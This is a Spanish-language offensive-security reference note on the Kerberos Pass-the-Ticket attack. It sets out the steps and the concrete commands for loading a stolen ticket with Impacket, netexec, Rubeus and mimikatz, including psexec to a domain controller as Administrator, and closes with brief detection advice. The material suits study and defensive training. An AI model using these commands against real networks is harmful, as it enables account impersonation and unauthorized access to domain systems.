---
title: Pass the Ticket (PtT)
resumen: Robar y reutilizar un ticket Kerberos (TGT o TGS) para autenticarse sin conocer contraseña ni hash.
tags: mimikatz, rubeus, impacket
---

## Definición

Se produce cuando un atacante roba un ticket Kerberos — ya sea un TGT (*Ticket Granting Ticket*) o un TGS (*Ticket Granting Service*) — y lo reutiliza para obtener acceso no autorizado a servicios, suplantando a la identidad original del ticket sin necesitar su contraseña ni su hash.

## Cuándo se usa

Cuando se obtiene un ticket de la memoria de un proceso, de un fichero volcado, o como resultado de otro ataque (por ejemplo, un Golden o Silver Ticket recién fabricado). También es la forma habitual de "cargar" en la sesión actual un ticket generado offline con `ticketer` o `getST`.

## Requisitos previos

- Un ticket Kerberos válido (`.kirbi` en Windows/Mimikatz/Rubeus, o `.ccache` en Linux/Impacket).
- Si el ticket viene del "otro mundo" (por ejemplo, un `.kirbi` que se quiere usar desde Linux), convertirlo primero con `ticketConverter`.

## Desarrollo del ataque

1. Obtener el ticket (robado, volcado o generado).
2. Cargarlo en la sesión/máquina desde la que se va a operar.
3. Usar cualquier herramienta que soporte autenticación Kerberos (netexec, impacket, psexec...) apuntando a ese ticket en memoria.

```bash
# Linux/Impacket: exportar el ticket en memoria y listarlo
export KRB5CCNAME=ticket.ccache
klist

# Comprobación de que el ticket es válido
nxc smb 192.168.98.2 -k --use-kcache

# Autenticarse con el ticket cargado
impacket-psexec dominio.corp/Administrator@DC01.dominio.corp -k -no-pass
```

```powershell
# Windows/Rubeus: importar un ticket .kirbi en la sesión actual
Rubeus.exe ptt /ticket:ticket.kirbi
```

```powershell
# Windows/mimikatz: cargar un ticket .kirbi en la sesión
kerberos::ptt <RutaAlFicheroKirbi>
```

## Herramientas relacionadas

- Ver [[mimikatz]]
- Ver [[rubeus]]
- Ver [[impacket]] (ticketConverter)

## Detección y mitigación

Monitorizar el evento 4769 (solicitud de TGS) en busca de tickets con tiempos de vida anómalos o usados desde equipos que no coinciden con el patrón habitual del usuario, y limitar el tiempo de vida máximo de los tickets Kerberos vía política.
